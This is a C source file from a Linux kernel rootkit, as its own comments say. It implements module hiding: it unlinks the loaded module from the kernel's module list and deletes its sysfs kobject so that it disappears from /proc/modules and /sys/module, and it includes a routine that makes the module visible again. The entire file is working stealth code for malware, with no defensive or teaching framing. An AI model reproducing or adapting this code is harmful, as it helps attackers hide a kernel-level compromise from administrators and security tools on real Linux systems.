#include "module_hiding.h"
#include "utils.h"

/* pointer to the module entries above the rootkit in /proc/modules and
   /sys/module */
static struct list_head *prev_module;
static struct list_head *prev_kobj_module;

unsigned int module_hidden = 0x0;

void do_hide_module(void)
{
  /* check if module is already hidden */
  if (module_hidden)
    return;
  
  /* hide module from procfs view */
  prev_module = THIS_MODULE->list.prev;
  list_del_rcu((void *)&THIS_MODULE->list);
  
  /* hide module from sysfs view */
  prev_kobj_module = THIS_MODULE->mkobj.kobj.entry.prev;
  kobject_del(&THIS_MODULE->mkobj.kobj);
  list_del_rcu(&THIS_MODULE->mkobj.kobj.entry);

  /* mark the module as hidden */
  module_hidden = (unsigned int)0x1;
}

void do_show_module(void)
{
  /* check if module is already shown */
  if (!module_hidden)
    return;

  /* show module in procfs view */
  list_add(&THIS_MODULE->list, prev_module);

  /* show module in sysfs view */
  kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");

  /* mark the module as not hidden */
  module_hidden = (unsigned int)0x0;
}
